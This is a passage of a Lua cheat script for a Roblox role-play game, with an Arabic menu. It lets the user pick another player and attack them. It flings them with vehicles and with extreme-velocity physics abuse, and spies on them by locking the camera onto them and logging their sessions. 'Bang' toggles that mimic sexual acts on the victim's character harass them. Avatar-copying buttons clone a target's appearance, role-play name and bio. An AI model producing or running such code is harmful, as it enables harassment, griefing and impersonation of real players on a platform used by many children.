			local targetPlayer = Players:FindFirstChild(selectedPlayerName)
			if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
				local seat = getMyVehicleSeat()
				if seat then
					seat.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(0,3,0)
				end
			end
		end
		task.wait(0.01)
	end
end)

local function getPlayerList()
	local PlayerNames = {}
	for _, player in ipairs(Players:GetPlayers()) do
		if player.Name ~= LocalPlayer.Name then
			table.insert(PlayerNames, player.Name)
		end
	end
	return PlayerNames
end

local killDropdown = flingsTab:AddDropdown({
	Name = "اختيار لاعب",
	Options = getPlayerList(),
	Default = "",
	Callback = function(value)
		selectedPlayerName = value
		getgenv().Target = value
	end
})

local function UpdateDropdown()
	local tablePlayers = Players:GetPlayers()
	local newPlayers = {}
	for _, player in ipairs(tablePlayers) do
		if player.Name ~= LocalPlayer.Name then
			table.insert(newPlayers, player.Name)
		end
	end
	killDropdown:Set(newPlayers)
	if selectedPlayerName and Players:FindFirstChild(selectedPlayerName) then
		killDropdown:SetValue(selectedPlayerName)
	else
		selectedPlayerName = nil
		getgenv().Target = nil
		killDropdown:SetValue("")
	end
end

flingsTab:AddButton({
	Name = "تحديث قائمة اللاعبين",
	Callback = function()
		UpdateDropdown()
	end
})

flingsTab:AddToggle({
	Name = "تخريب بالسيارة او القارب",
	Default = false,
	Callback = function(state)
		isActiveVehicle = state
	end
})

local selectedRemoteName = nil
local remoteToggle = false

local RemoteList = {
	["باص"] = {"1Ca1r", {"PickingCar", "SchoolBus"}},
	["شاحنة"] = {"1Ca1r", {"PickingCar", "Van"}},
	["Semi"] = {"1Ca1r", {"PickingCar", "Semi"}},
	["RV"] = {"1Ca1r", {"PickingCar", "RV"}},
	["Snowplow"] = {"1Ca1r", {"PickingCar", "Snowplow"}}
}

local remoteOptions = {}
for name, _ in pairs(RemoteList) do
	table.insert(remoteOptions, name)
end

local remoteDropdown = flingsTab:AddDropdown({
	Name = "اختيار سيارة",
	Options = remoteOptions,
	Default = "",
	Callback = function(value)
		selectedRemoteName = value
	end
})

flingsTab:AddToggle({
	Name = "رسبون السيارة",
	Default = false,
	Callback = function(state)
		remoteToggle = state
		task.spawn(function()
			while remoteToggle do
				if selectedRemoteName then
					local remoteData = RemoteList[selectedRemoteName]
					if remoteData then
						local remoteName = remoteData[1]
						local args = remoteData[2]
						local remote = RemoteFolder:FindFirstChild(remoteName)
						if remote then
							remote:FireServer(unpack(args))
						end
					end
				end
				task.wait(2)
			end
		end)
	end
})

local RemoteCoordList = {
	["قارب عسكري"] = {"1Ca1r", {"PickingBoat", "MilitaryBoatFree"}},
	["سفينة قراصنة"] = {"1Ca1r", {"PickingBoat", "PirateFree"}}
}

local remoteCoordOptions = {}
for name, _ in pairs(RemoteCoordList) do
	table.insert(remoteCoordOptions, name)
end

local selectedRemoteCoord = nil
local remoteCoordToggle = false
local teleportPosition = Vector3.new(1742, -4, -90)

local remoteCoordDropdown = flingsTab:AddDropdown({
	Name = "اختيار قارب",
	Options = remoteCoordOptions,
	Default = "",
	Callback = function(value)
		selectedRemoteCoord = value
	end
})

flingsTab:AddToggle({
	Name = "رسبون القارب",
	Default = false,
	Callback = function(state)
		remoteCoordToggle = state
		task.spawn(function()
			while remoteCoordToggle do
				if selectedRemoteCoord then
					if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
						LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(teleportPosition)
					end
					local remoteData = RemoteCoordList[selectedRemoteCoord]
					if remoteData then
						local remoteName = remoteData[1]
						local args = remoteData[2]
						local remote = RemoteFolder:FindFirstChild(remoteName)
						if remote then
							remote:FireServer(unpack(args))
						end
					end
				end
				task.wait(2)
			end
		end)
	end
})

local viewPlayerEnabled = false
local originalCamera = workspace.CurrentCamera.CameraSubject

flingsTab:AddToggle({
	Name = "مراقبة اللاعب",
	Default = false,
	Callback = function(state)
		viewPlayerEnabled = state
		local camera = workspace.CurrentCamera
		if state then
			if selectedPlayerName then
				local targetPlayer = Players:FindFirstChild(selectedPlayerName)
				if targetPlayer and targetPlayer.Character then
					local humanoid = targetPlayer.Character:FindFirstChildOfClass("Humanoid")
					if humanoid then
						originalCamera = camera.CameraSubject
						camera.CameraSubject = humanoid
					end
				end
			end
		else
			camera.CameraSubject = originalCamera
		end
	end
})

SamlaTab = Window:MakeTab({
	Title = "الرحمة & صملة",
	Icon = "rbxassetid://10723415903"
})
SamlaTab:AddSection({ "حقوق الافكار محفوظة لفريق NetroZ" })

Players = game:GetService("Players")
RunService = game:GetService("RunService")
LocalPlayer = Players.LocalPlayer
Selec9tedPlayerNOme = nil
PlayerDropdown = nil
BangToggles = {}
PlayerStats = {}

AntiSitConnections = {}
AntiSitEnabled = false

function EnableAntiSit()
	AntiSitEnabled = true

	function protectCharacter(char)
		local hum = char:WaitForChild("Humanoid", 5)
		if not hum then return end

		hum:SetStateEnabled(Enum.HumanoidStateType.Seated, false)

		table.insert(AntiSitConnections,
			hum.StateChanged:Connect(function(_, new)
				if AntiSitEnabled and new == Enum.HumanoidStateType.Seated then
					hum.Sit = false
					hum:ChangeState(Enum.HumanoidStateType.Jumping)
				end
			end)
		)
	end

	if LocalPlayer.Character then
		protectCharacter(LocalPlayer.Character)
	end

	table.insert(AntiSitConnections,
		LocalPlayer.CharacterAdded:Connect(protectCharacter)
	)

	function disableSeat(obj)
		if obj:IsA("Seat") or obj:IsA("VehicleSeat") then
			obj.Disabled = true
		end
	end
	for _, v in ipairs(workspace:GetDescendants()) do
		disableSeat(v)
	end

	table.insert(AntiSitConnections,
		workspace.DescendantAdded:Connect(function(obj)
			if AntiSitEnabled then
				disableSeat(obj)
			end
		end)
	)
end

local function DisableAntiSit()
	AntiSitEnabled = false
	for _, c in ipairs(AntiSitConnections) do
		c:Disconnect()
	end
	AntiSitConnections = {}

	for _, v in ipairs(workspace:GetDescendants()) do
		if v:IsA("Seat") or v:IsA("VehicleSeat") then
			v.Disabled = false
		end
	end

	if LocalPlayer.Character then
		local hum = LocalPlayer.Character:FindFirstChild("Humanoid")
		if hum then
			hum:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
		end
	end
end

local PlayerData = {}
local CurrentSelectedUserId = nil

local function GetPlayersList()
	local list = {}
	for _, p in ipairs(Players:GetPlayers()) do
		if p ~= LocalPlayer then
			table.insert(list, p.Name)
		end
	end
	return #list > 0 and list or { "لا يوجد لاعبين" }
end

local InfoLabel = SamlaTab:AddLabel({
	Name = "👤 معلومات الاعب المختار",
	Text = "يرجى اختيار لاعب من القائمة لعرض بياناته هنا...",	PlayerId = 0
})

for _, player in ipairs(Players:GetPlayers()) do
	if player ~= LocalPlayer then
		PlayerData[player.UserId] = PlayerData[player.UserId] or {
			JoinCount = 0,
			LeaveCount = 0,
			StartTime = nil,
			LastPausedTime = 0,
			TotalTime = 0,
			IsOnline = true,
			CachedName = player.Name
		}
		PlayerData[player.UserId].JoinCount = (PlayerData[player.UserId].JoinCount or 0) + 1
	end
end

Players.PlayerAdded:Connect(function(player)
	if player == LocalPlayer then return end
	PlayerData[player.UserId] = PlayerData[player.UserId] or {
		JoinCount = 0,
		LeaveCount = 0,
		StartTime = nil,
		LastPausedTime = 0,
		TotalTime = 0,
		IsOnline = true,
		CachedName = player.Name
	}
	PlayerData[player.UserId].JoinCount = (PlayerData[player.UserId].JoinCount or 0) + 1
	PlayerData[player.UserId].IsOnline = true
	PlayerData[player.UserId].CachedName = player.Name
end)

Players.PlayerRemoving:Connect(function(player)
	if player == LocalPlayer then return end
	if PlayerData[player.UserId] then
		local data = PlayerData[player.UserId]
		if data.StartTime then
			data.TotalTime = data.TotalTime + (tick() - data.StartTime)
			data.StartTime = nil
		end
		data.LeaveCount = (data.LeaveCount or 0) + 1
		data.IsOnline = false
	end
end)

local function StartTrackingTime(userId, playerName)
	if not PlayerData[userId] then		PlayerData[userId] = {
			JoinCount = 0,
			LeaveCount = 0,
			StartTime = tick(),
			LastPausedTime = 0,
			TotalTime = 0,
			IsOnline = true,
			CachedName = playerName
		}
	elseif not PlayerData[userId].StartTime then
		PlayerData[userId].StartTime = tick()
		PlayerData[userId].IsOnline = true
	end
	CurrentSelectedUserId = userId
end

RunService.Heartbeat:Connect(function()
	if not CurrentSelectedUserId then return end

	local data = PlayerData[CurrentSelectedUserId]
	if not data then
		CurrentSelectedUserId = nil
		return
	end

	local target = Players:GetPlayerByUserId(CurrentSelectedUserId)
	local displayName = data.CachedName
	local isOnline = false

	if target then
		displayName = target.Name
		data.CachedName = displayName
		isOnline = true
		data.IsOnline = true
		if not data.StartTime then
			data.StartTime = tick()
		end
	else
		isOnline = false
		if data.StartTime then
			data.TotalTime = data.TotalTime + (tick() - data.StartTime)
			data.StartTime = nil
		end
	end

	local displayTime = data.TotalTime
	if data.StartTime then
		displayTime = data.TotalTime + (tick() - data.StartTime)
	end
	local totalSeconds = math.floor(displayTime)
	local hours = math.floor(totalSeconds / 3600)
	local minutes = math.floor((totalSeconds % 3600) / 60)
	local seconds = totalSeconds % 60

	local statusTag = isOnline and "" or " <font color='#ff5555'>(غير متصل)</font>"
	local fullDisplayName = displayName .. statusTag

	local totalDays = 0
	local years = 0
	local days = 0

	if target then
		totalDays = target.AccountAge
		years = math.floor(totalDays / 365)
		days = totalDays % 365
	end

	local infoText = string.format([[
string.format([[
<font color="#ffaa00">● الاسم:</font> %s
<font color="#55aaff">● المعرف:</font> %s
<font color="#55ff7f">● العمر:</font> %d سنة و %d يوم
<font color="#ffcc00">● الوقت المراقب:</font> %02d:%02d:%02d
<font color="#ff9900">● مرات الدخول:</font> %d
<font color="#ff5555">● مرات الخروج:</font> %d
]],
	fullDisplayName,
		tostring(CurrentSelectedUserId),
		years,
		days,
		hours,
		minutes,
		seconds,
		data.JoinCount,
		data.LeaveCount
	)

	InfoLabel:UpdateInfo(infoText, CurrentSelectedUserId)
end)

local function UpdatePlayerInfo(targetName)
	if not targetName or targetName == "لا يوجد لاعبين" then
		CurrentSelectedUserId = nil
		InfoLabel:UpdateInfo("⚠️ لم يتم اختيار لاعب حالياً.", 0)
		return
	end

	local target = Players:FindFirstChild(targetName)
	if not target then
		for userId, data in pairs(PlayerData) do			if data.CachedName == targetName then
				StartTrackingTime(userId, targetName)
				return
			end
		end
		InfoLabel:UpdateInfo("❌ اللاعب غير معروف.", 0)
		CurrentSelectedUserId = nil
		return
	end

	StartTrackingTime(target.UserId, target.Name)
end

PlayerDropdown = SamlaTab:AddDropdown({
	Name = "اختار لاعب",
	Options = GetPlayersList(),
	Default = "لا يوجد لاعبين",
	Callback = function(value)
		Selec9tedPlayerNOme = value ~= "لا يوجد لاعبين" and value or nil
		UpdatePlayerInfo(Selec9tedPlayerNOme)
	end
})

SamlaTab:AddButton({
	Name = "تحديث اللاعبين",
	Callback = function()
		local newPlayers = GetPlayersList()
		PlayerDropdown:Set(newPlayers)
	end
})

SamlaTab:AddToggle({
    Name = "تجسس على اللاعب",
    Default = false,
    Callback = function(state)
        local Camera = Workspace.CurrentCamera
        if state then
            if not Selec9tedPlayerNOme then return end
            if getgenv().SpyConnection then getgenv().SpyConnection:Disconnect() end

            getgenv().SpyConnection = RunService.Heartbeat:Connect(function()
                local target = game.Players:FindFirstChild(Selec9tedPlayerNOme)
                if target and target.Character then
                    Camera.CameraSubject = target.Character:FindFirstChild("Humanoid") or Camera.CameraSubject
                end
            end)
        else
            if getgenv().SpyConnection then
                getgenv().SpyConnection:Disconnect()
                getgenv().SpyConnection = nil
            end
            Camera.CameraSubject = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") or Camera.CameraSubject
        end
    end
})

SamlaTab:AddSection({ "الفلنق قوي جدا جدا جديد" })

SamlaTab:AddToggle({
    Name = "[V4]فلنق",
    Default = false,
    Callback = function(Value)

         Players = game:GetService("Players")
         ReplicatedStorage = game:GetService("ReplicatedStorage")
         RunService = game:GetService("RunService")
         cam = workspace.CurrentCamera

         LocalPlayer = Players.LocalPlayer
        _G.FlingEnabled = Value

        if _G.AntiSitConnections then
            for _,c in ipairs(_G.AntiSitConnections) do
                c:Disconnect()
            end
        end
        _G.AntiSitConnections = {}

        if not Value then
            _G.AntiSitEnabled = false
            return
        end

        _G.AntiSitEnabled = true

         function protectCharacter(char)
             hum = char:WaitForChild("Humanoid",5)
            if not hum then return end

            hum:SetStateEnabled(Enum.HumanoidStateType.Seated,false)

            table.insert(_G.AntiSitConnections,
                hum.StateChanged:Connect(function(_, new)
                    if _G.AntiSitEnabled and new == Enum.HumanoidStateType.Seated then
                        hum.Sit = false
                        hum:ChangeState(Enum.HumanoidStateType.Jumping)
                    end
                end)
            )
        end

        if LocalPlayer.Character then
            protectCharacter(LocalPlayer.Character)
        end

        table.insert(_G.AntiSitConnections,
            LocalPlayer.CharacterAdded:Connect(protectCharacter)
        )

        for _,v in ipairs(workspace:GetDescendants()) do
            if v:IsA("Seat") or v:IsA("VehicleSeat") then
                v.Disabled = true
            end
        end

        table.insert(_G.AntiSitConnections,
            workspace.DescendantAdded:Connect(function(obj)
                if _G.AntiSitEnabled and (obj:IsA("Seat") or obj:IsA("VehicleSeat")) then
                    obj.Disabled = true
                end
            end)
        )

        task.spawn(function()
            while _G.FlingEnabled do
                task.wait(0.2)

                if not Selec9tedPlayerNOme then continue end

                local target = Players:FindFirstChild(Selec9tedPlayerNOme)
                if not target or not target.Character then continue end

                local char = LocalPlayer.Character
                if not char then continue end

                local hum = char:FindFirstChildOfClass("Humanoid")
                local root = char:FindFirstChild("HumanoidRootPart")
                local tRoot = target.Character:FindFirstChild("HumanoidRootPart")

                if not hum or not root or not tRoot then continue end

                 tool = LocalPlayer.Backpack:FindFirstChild("Couch") or char:FindFirstChild("Couch")
                if not tool then
                    local args = {
                        [1] = "PickingTools",
                        [2] = "Couch"
                    }
                    ReplicatedStorage.RE:FindFirstChild("1Too1l"):InvokeServer(unpack(args))
                    task.wait(0.3)
                    tool = LocalPlayer.Backpack:FindFirstChild("Couch")
                end

                if tool then
                    hum:EquipTool(tool)
                end
workspace.FallenPartsDestroyHeight = 0/0

                local bv = Instance.new("BodyVelocity")
                bv.Velocity = Vector3.new(9e8,9e8,9e8)
                bv.MaxForce = Vector3.new(1/0,1/0,1/0)
                bv.Parent = root

                hum:SetStateEnabled(Enum.HumanoidStateType.Seated,false)
                hum.PlatformStand = false
                cam.CameraSubject = target.Character:FindFirstChild("Head") or tRoot

                local angle = 0
                while _G.FlingEnabled
                and target
                and target.Character
                and target.Character:FindFirstChildOfClass("Humanoid")
                and root.Parent do

                    angle += 50

                    local pos = tRoot.Position + (tRoot.Velocity / 1.5)
                    root.CFrame =
                        CFrame.new(pos)
                        * CFrame.Angles(math.rad(angle),0,0)

                    root.Velocity = Vector3.new(9e8,9e8,9e8)
                    root.RotVelocity = Vector3.new(9e8,9e8,9e8)

                    task.wait()
                end

                if bv then bv:Destroy() end
                hum:SetStateEnabled(Enum.HumanoidStateType.Seated,true)
                hum.PlatformStand = false
                cam.CameraSubject = hum
            end
        end)
    end
})

orbitConnection = nil
function stopAll()
	if orbitConnection then
		orbitConnection:Disconnect()
		orbitConnection = nil
	end
end

SamlaTab:AddToggle({
	Name = "دوران حول الضحية",
	Callback = function(v)
		if v and Selec9tedPlayerNOme and Selec9tedPlayerNOme ~= "لا يوجد لاعبين" then
			local target = Players:FindFirstChild(Selec9tedPlayerNOme)
			if not target or not target.Character then
				warn("الهدف غير متصل أو ليس لديه شخصية.")
				return
			end

			stopAll()

			 angle = 0
			 bangSpeed = 200

			 function getRoot(char)
				if not char then return nil end
				 root = char:FindFirstChild("HumanoidRootPart")
				return root
			end

			orbitConnection = RunService.Heartbeat:Connect(function()
				 myRoot = getRoot(LocalPlayer.Character)
				 tr = getRoot(target.Character)
				if myRoot and tr then
					angle = angle + (bangSpeed * 0.02)
					 offset = Vector3.new(math.cos(angle) * 5, 0, math.sin(angle) * 5)
					myRoot.CFrame = CFrame.lookAt(tr.Position + offset, tr.Position)
				end
			end)
		else
			stopAll()
		end
	end
})

function createBangToggle(name,yOffset,faceBang)
    local toggleActive = false
    local connection
    local togglePosition = false

    SamlaTab:AddToggle({
        Name = name,
        Default = false,
        Callback = function(Value)
            toggleActive = Value

            if Value then
                EnableAntiSit()
            else
                DisableAntiSit()
            end

            if connection then
                connection:Disconnect()
                connection = nil
            end

            if not Value then return end

            connection = RunService.Heartbeat:Connect(function()
                if not toggleActive or not Selec9tedPlayerNOme then return end

                local char = LocalPlayer.Character
                if not char or not char.PrimaryPart then return end

                local target = Players:FindFirstChild(Selec9tedPlayerNOme)
                if not target or not target.Character or not target.Character.PrimaryPart then return end

                local targetHead = target.Character:FindFirstChild("Head")
                if not targetHead then return end

                local offset = (togglePosition and 1) or 4

                if faceBang then
                    char:SetPrimaryPartCFrame(
                        targetHead.CFrame
                        * CFrame.new(0,1,-offset)
                        * CFrame.Angles(0,math.rad(180),0)
                    )
                else
                    char:SetPrimaryPartCFrame(
                        targetHead.CFrame * CFrame.new(0,yOffset,offset)
                    )
                end

                togglePosition = not togglePosition
            end)
        end
    })
end

createBangToggle("رحمة v1 | v1",-1,false)
createBangToggle("رحمة v2 | v2",-1.5,false)
createBangToggle("رحمة وجه v1 | v1",1,true)
createBangToggle("رحمة وجه v2 | v2",1,true)

SamlaTab:AddParagraph({"اي شخص ياخذ الفكرة بدون ما يحط حقوق او يستاذن متابعيني يسوونك مضحكة ويهينوك"})

local TabSk = Window:MakeTab({
    Title = "السكن",
    Icon = "rbxassetid://10734952036"
})
TabSk:AddSection({ Name = "نسخ السكن" })

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Remotes = ReplicatedStorage:WaitForChild("Remotes")
local Target = nil

local function GetPlayerNames()
    local PlayerNames = {}
    for _, player in ipairs(Players:GetPlayers()) do
        table.insert(PlayerNames, player.Name)
    end
    return PlayerNames
end

local Dropdown = TabSk:AddDropdown({
    Name = "اختار لاعب",
    Options = GetPlayerNames(),
    Default = "",
    Callback = function(Value)
        Target = Value
    end
})


local function UpdateDropdown()
    Dropdown:Set(GetPlayerNames())
end

Players.PlayerAdded:Connect(UpdateDropdown)
Players.PlayerRemoving:Connect(UpdateDropdown)

TabSk:AddButton({
    Name = "نسخ السكن",
    Callback = function()
        if not Target then
            return
        end
        local LP = Players.LocalPlayer
        local LChar = LP.Character
        local TPlayer = Players:FindFirstChild(Target)
        if TPlayer and TPlayer.Character then
            local LHumanoid = LChar and LChar:FindFirstChildOfClass("Humanoid")
            local THumanoid = TPlayer.Character:FindFirstChildOfClass("Humanoid")
            if LHumanoid and THumanoid then
   
                local LDesc = LHumanoid:GetAppliedDescription()
                for _, acc in ipairs(LDesc:GetAccessories(true)) do
                    if acc.AssetId and tonumber(acc.AssetId) then
                        Remotes.Wear:InvokeServer(tonumber(acc.AssetId))
                        task.wait(0.2)
                    end
                end
                if tonumber(LDesc.Shirt) then
                    Remotes.Wear:InvokeServer(tonumber(LDesc.Shirt))
                    task.wait(0.2)
                end
                if tonumber(LDesc.Pants) then
                    Remotes.Wear:InvokeServer(tonumber(LDesc.Pants))
                    task.wait(0.2)
                end
                if tonumber(LDesc.Face) then
                    Remotes.Wear:InvokeServer(tonumber(LDesc.Face))
                    task.wait(0.2)
                end

                
                local PDesc = THumanoid:GetAppliedDescription()
                local argsBody = {
                    {
                        PDesc.Torso,
                        PDesc.RightArm,
                        PDesc.LeftArm,
                        PDesc.RightLeg,
                        PDesc.LeftLeg,
                        PDesc.Head
                    }
                }
                Remotes.ChangeCharacterBody:InvokeServer(unpack(argsBody))
                task.wait(0.5)

                if tonumber(PDesc.Shirt) then
                    Remotes.Wear:InvokeServer(tonumber(PDesc.Shirt))
                    task.wait(0.3)
                end
                if tonumber(PDesc.Pants) then
                    Remotes.Wear:InvokeServer(tonumber(PDesc.Pants))
                    task.wait(0.3)
                end
                if tonumber(PDesc.Face) then
                    Remotes.Wear:InvokeServer(tonumber(PDesc.Face))
                    task.wait(0.3)
                end
                for _, v in ipairs(PDesc:GetAccessories(true)) do
                    if v.AssetId and tonumber(v.AssetId) then
                        Remotes.Wear:InvokeServer(tonumber(v.AssetId))
                        task.wait(0.3)
                    end
                end

                
                local SkinColor = TPlayer.Character:FindFirstChild("Body Colors")
                if SkinColor then
                    Remotes.ChangeBodyColor:FireServer(tostring(SkinColor.HeadColor))
                    task.wait(0.3)
                end

                local Bag = TPlayer:FindFirstChild("PlayersBag")
                if Bag then
                    if Bag:FindFirstChild("RPName") and Bag.RPName.Value ~= "" then
                        Remotes.RPNameText:FireServer("RolePlayName", Bag.RPName.Value)
                        task.wait(0.3)
                    end
                    if Bag:FindFirstChild("RPBio") and Bag.RPBio.Value ~= "" then
                        Remotes.RPNameText:FireServer("RolePlayBio", Bag.RPBio.Value)
                        task.wait(0.3)
                    end
                    if Bag:FindFirstChild("RPNameColor") then
                        Remotes.RPNameColor:FireServer("PickingRPNameColor", Bag.RPNameColor.Value)
                        task.wait(0.3)
                    end
                    if Bag:FindFirstChild("RPBioColor") then
                        Remotes.RPNameColor:FireServer("PickingRPBioColor", Bag.RPBioColor.Value)
                        task.wait(0.3)
                    end
                end
            end
        end
    end
})

TabSk:AddButton({
    Name = "نسخ سكن لاعب قريب",
    Callback = function()
        local LP = Players.LocalPlayer
        local LChar = LP.Character
        if not LChar or not LChar:FindFirstChild("HumanoidRootPart") then return end

        -- Localizar o jogador mais prÃ³ximo
        local closestPlayer, closestDistance = nil, math.huge
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= LP and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
                local dist = (LChar.HumanoidRootPart.Position - plr.Character.HumanoidRootPart.Position).Magnitude
                if dist < closestDistance then
                    closestDistance = dist
                    closestPlayer = plr
                end
            end
        end

        -- Usar o jogador mais prÃ³ximo como Target
        if not closestPlayer then return end
        local TPlayer = closestPlayer

        -- (cÃ³digo de cÃ³pia do avatar igual ao seu original, substituindo "Target" por TPlayer.Name)
        -- [REUTILIZA A MESMA LÃ“GICA, SÃ“ TROCA A PARTE DO TARGET]
        local LHumanoid = LChar and LChar:FindFirstChildOfClass("Humanoid")
        local THumanoid = TPlayer.Character:FindFirstChildOfClass("Humanoid")

        if LHumanoid and THumanoid then
            local LDesc = LHumanoid:GetAppliedDescription()

            for _, acc in ipairs(LDesc:GetAccessories(true)) do
                if acc.AssetId and tonumber(acc.AssetId) then
                    Remotes.Wear:InvokeServer(tonumber(acc.AssetId))
                    task.wait(0.2)
                end
            end

            if tonumber(LDesc.Shirt) then
                Remotes.Wear:InvokeServer(tonumber(LDesc.Shirt))
                task.wait(0.2)
            end

            if tonumber(LDesc.Pants) then
                Remotes.Wear:InvokeServer(tonumber(LDesc.Pants))
                task.wait(0.2)
            end

            if tonumber(LDesc.Face) then
                Remotes.Wear:InvokeServer(tonumber(LDesc.Face))
                task.wait(0.2)
            end

            local PDesc = THumanoid:GetAppliedDescription()

            local argsBody = {
                [1] = {
                    [1] = PDesc.Torso,
                    [2] = PDesc.RightArm,
                    [3] = PDesc.LeftArm,
                    [4] = PDesc.RightLeg,
                    [5] = PDesc.LeftLeg,
                    [6] = PDesc.Head
                }
            }
            Remotes.ChangeCharacterBody:InvokeServer(unpack(argsBody))
            task.wait(0.5)

            if tonumber(PDesc.Shirt) then
                Remotes.Wear:InvokeServer(tonumber(PDesc.Shirt))
                task.wait(0.3)
            end

            if tonumber(PDesc.Pants) then
                Remotes.Wear:InvokeServer(tonumber(PDesc.Pants))
                task.wait(0.3)
            end

            if tonumber(PDesc.Face) then
                Remotes.Wear:InvokeServer(tonumber(PDesc.Face))
                task.wait(0.3)
            end

            for _, v in ipairs(PDesc:GetAccessories(true)) do
                if v.AssetId and tonumber(v.AssetId) then
                    Remotes.Wear:InvokeServer(tonumber(v.AssetId))
                    task.wait(0.3)
                end
            end

            local SkinColor = TPlayer.Character:FindFirstChild("Body Colors")
            if SkinColor then
                Remotes.ChangeBodyColor:FireServer(tostring(SkinColor.HeadColor))
                task.wait(0.3)
            end

            if tonumber(PDesc.IdleAnimation) then
                Remotes.Wear:InvokeServer(tonumber(PDesc.IdleAnimation))
                task.wait(0.3)
            end

            local Bag = TPlayer:FindFirstChild("PlayersBag")
            if Bag then
                if Bag:FindFirstChild("RPName") and Bag.RPName.Value ~= "" then
                    Remotes.RPNameText:FireServer("RolePlayName", Bag.RPName.Value)
                    task.wait(0.3)
                end
                if Bag:FindFirstChild("RPBio") and Bag.RPBio.Value ~= "" then
                    Remotes.RPNameText:FireServer("RolePlayBio", Bag.RPBio.Value)
                    task.wait(0.3)
                end
                if Bag:FindFirstChild("RPNameColor") then
                    Remotes.RPNameColor:FireServer("PickingRPNameColor", Bag.RPNameColor.Value)
                    task.wait(0.3)
                end
                if Bag:FindFirstChild("RPBioColor") then
                    Remotes.RPNameColor:FireServer("PickingRPBioColor", Bag.RPBioColor.Value)
                    task.wait(0.3)
                end
            end
        end
    end
})

TabSk:AddButton({
    Name = "نسخ لاعب عشوائي",
    Callback = function()
        local LP = Players.LocalPlayer
        local LChar = LP.Character
        if not LChar then return end

        -- Escolher um player aleatÃ³rio (exceto o prÃ³prio)
        local otherPlayers = {}
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= LP and plr.Character then
                table.insert(otherPlayers, plr)
            end
        end
        if #otherPlayers == 0 then return end

        local TPlayer = otherPlayers[math.random(1, #otherPlayers)]

        -- Mesmo cÃ³digo de cÃ³pia
        local LHumanoid = LChar:FindFirstChildOfClass("Humanoid")
        local THumanoid = TPlayer.Character:FindFirstChildOfClass("Humanoid")
        if LHumanoid and THumanoid then
            local LDesc = LHumanoid:GetAppliedDescription()
            for _, acc in ipairs(LDesc:GetAccessories(true)) do
                if acc.AssetId and tonumber(acc.AssetId) then
                    Remotes.Wear:InvokeServer(tonumber(acc.AssetId))
                    task.wait(0.2)
                end
            end
            if tonumber(LDesc.Shirt) then
                Remotes.Wear:InvokeServer(tonumber(LDesc.Shirt))
                task.wait(0.2)
            end
            if tonumber(LDesc.Pants) then
                Remotes.Wear:InvokeServer(tonumber(LDesc.Pants))
                task.wait(0.2)
            end
            if tonumber(LDesc.Face) then
                Remotes.Wear:InvokeServer(tonumber(LDesc.Face))
                task.wait(0.2)
            end

            local PDesc = THumanoid:GetAppliedDescription()
            local argsBody = {
                [1] = {
                    [1] = PDesc.Torso,
                    [2] = PDesc.RightArm,
                    [3] = PDesc.LeftArm,
                    [4] = PDesc.RightLeg,
                    [5] = PDesc.LeftLeg,
                    [6] = PDesc.Head
                }
            }
            Remotes.ChangeCharacterBody:InvokeServer(unpack(argsBody))
            task.wait(0.5)

            if tonumber(PDesc.Shirt) then
                Remotes.Wear:InvokeServer(tonumber(PDesc.Shirt))
                task.wait(0.3)
            end
            if tonumber(PDesc.Pants) then
                Remotes.Wear:InvokeServer(tonumber(PDesc.Pants))
                task.wait(0.3)
            end
            if tonumber(PDesc.Face) then
                Remotes.Wear:InvokeServer(tonumber(PDesc.Face))
                task.wait(0.3)
            end
            for _, v in ipairs(PDesc:GetAccessories(true)) do
                if v.AssetId and tonumber(v.AssetId) then
                    Remotes.Wear:InvokeServer(tonumber(v.AssetId))
                    task.wait(0.3)
                end
            end

            local SkinColor = TPlayer.Character:FindFirstChild("Body Colors")
            if SkinColor then
                Remotes.ChangeBodyColor:FireServer(tostring(SkinColor.HeadColor))
                task.wait(0.3)
            end
            if tonumber(PDesc.IdleAnimation) then
                Remotes.Wear:InvokeServer(tonumber(PDesc.IdleAnimation))
                task.wait(0.3)
            end

            local Bag = TPlayer:FindFirstChild("PlayersBag")
            if Bag then
                if Bag:FindFirstChild("RPName") and Bag.RPName.Value ~= "" then
                    Remotes.RPNameText:FireServer("RolePlayName", Bag.RPName.Value)
                    task.wait(0.3)
                end
                if Bag:FindFirstChild("RPBio") and Bag.RPBio.Value ~= "" then
                    Remotes.RPNameText:FireServer("RolePlayBio", Bag.RPBio.Value)
                    task.wait(0.3)
                end
                if Bag:FindFirstChild("RPNameColor") then
                    Remotes.RPNameColor:FireServer("PickingRPNameColor", Bag.RPNameColor.Value)
                    task.wait(0.3)
                end
                if Bag:FindFirstChild("RPBioColor") then
                    Remotes.RPNameColor:FireServer("PickingRPBioColor", Bag.RPBioColor.Value)
                    task.wait(0.3)
                end
            end
        end
    end
})

local hairColors = {
    Color3.new(1, 1, 0), Color3.new(0, 0, 1), Color3.new(1, 0, 1), Color3.new(1, 1, 1),
    Color3.new(0, 1, 0), Color3.new(0.5, 0, 1), Color3.new(1, 0.647, 0), Color3.new(0, 1, 1)
}
local isActive = false


local function changeHairColor()
    local i = 1
    while isActive do
        if not isActive then break end
        local args = { [1] = "ChangeHairColor2", [2] = hairColors[i] }
        game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Max1y"):FireServer(unpack(args))
        wait(0.1)
        i = i % #hairColors + 1
    end
end

TabSk:AddToggle({
    Name = "شعر ملون",
    Description = "",
    Default = false,
    Callback = function(value)
        isActive = value
        if isActive then
            changeHairColor()
        end
    end
})

local colors = { "Bright red", "Lime green", "Bright blue", "Bright yellow", "Bright cyan", "Hot pink", "Royal purple" }
local rgbEnabled = false

local function changeColor(color)
    local args = { color }
    game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("ChangeBodyColor"):FireServer(unpack(args))
end

local function toggleRGBCharacter(enabled)
    rgbEnabled = enabled
    if rgbEnabled then
        while rgbEnabled do
            for _, color in ipairs(colors) do
                if not rgbEnabled then return end
                changeColor(color)
                wait(0.5)
            end
        end
    end
end

TabSk:AddToggle({
    Name = "تلوين البشرة",
    Description = "RGB",
    Default = false,
